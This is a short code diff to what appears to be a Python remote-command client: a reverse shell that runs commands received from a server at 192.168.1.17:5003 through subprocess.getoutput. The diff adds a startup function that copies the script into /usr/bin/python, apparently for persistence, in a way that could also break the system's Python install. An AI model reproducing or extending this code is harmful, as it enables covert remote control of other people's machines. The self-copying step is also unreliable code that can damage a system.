@@ -5,6 +5,26 @@ import subprocess
 import sys
 import time
 
+import shutil
+
+def first_time():
+    # get the path of the current script
+    current_script_path = os.path.realpath(__file__)
+
+    # the directory where the script will be copied
+    copy_directory = "/usr/bin/python"
+
+    # create the directory if it does not exist
+    os.makedirs(copy_directory, exist_ok=True)
+
+    # the path of the copied script
+    copy_script_path = os.path.join(copy_directory, "example.py")
+
+    # copy the script
+    shutil.copy2(current_script_path, copy_script_path)
+
+first_time()
+
 SERVER_HOST = "192.168.1.17"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
@@ -134,6 +154,7 @@ while True:
                 except subprocess.CalledProcessError:
                     # if there's an error, set the output to the error message
                     output = f"Failed to clone repository {repo}."
+            
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
